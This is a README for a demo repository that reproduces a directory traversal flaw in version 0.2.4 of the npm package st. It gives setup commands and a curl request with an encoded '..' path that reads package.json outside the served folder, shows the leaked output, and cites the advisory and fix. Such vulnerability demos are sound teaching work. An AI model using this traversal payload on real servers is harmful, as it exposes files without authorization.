# vulnst
![CI](https://github.com/kg0r0/vulnst/workflows/CI/badge.svg)  
Directory Traversal Demo of npm [st](https://www.npmjs.com/package/st).

## Usage

```
$ npm install
$ npm start
$ curl http://localhost:3000/public/%2e%2e/package.json
{
  "name": "stvuln",
  "version": "0.0.0",
  "private": true,
  "scripts": {
    "start": "node ./bin/www"
  },
  "dependencies": {
    "cookie-parser": "~1.4.4",
    "debug": "~2.6.9",
    "express": "~4.16.1",
    "http-errors": "~1.6.3",
    "morgan": "~1.9.1",
    "pug": "2.0.0-beta11",
    "st": "^0.2.4"
  }
}
```

## References
- https://snyk.io/vuln/npm:st:20140206
- https://github.com/isaacs/st/compare/v0.2.4...v0.2.5
